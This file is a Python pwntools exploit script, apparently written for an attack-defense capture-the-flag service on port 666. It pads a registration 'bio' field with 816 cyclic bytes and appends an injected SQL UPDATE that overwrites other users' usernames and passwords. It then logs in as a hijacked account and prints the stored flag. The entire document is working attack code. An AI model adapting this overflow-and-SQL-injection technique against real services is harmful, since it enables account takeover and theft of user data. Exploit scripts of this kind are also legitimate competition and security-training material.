from pwn import *
import sys

context.log_level = "debug"
host = sys.argv[1]

def main(host):
    io = connect(host, 666)
    io.recvuntil(b'>>> ')
    io.sendline(b'1')
    io.recvuntil(b'[USERNAME]: ')
    g = cyclic(10)
    b = 'qwert'
    w = cyclic(816)
    r = cyclic(6)
    io.sendline(g)
    io.recvuntil(b'[PASSWORD]: ')
    io.sendline(b)
    io.recvuntil(b'[BIO]: ')
    io.sendline(f"{w.decode()}UPDATE users SET username='ASDFGF', password='qwert' WHERE LENGTH(bio)=32 OR username=$1")
    io.recvuntil(b'[AGE]: ')
    io.sendline(b'18')

    io.recvuntil(b'>>> ')

    io.sendline(b'2')
    io.recvuntil(b'[USERNAME]: ')
    io.sendline(b'ASDFGF')
    io.recvuntil(b'[PASSWORD]: ')
    io.sendline(b'qwert')

    io.recvuntil(b'>>> ')
    io.sendline(b'7')
    io.recvuntil(b'[Bio]: ')
    flag = io.recvline()[:-1].decode()
    print(flag, flush=True)

if __name__ == '__main__':
    main(host)
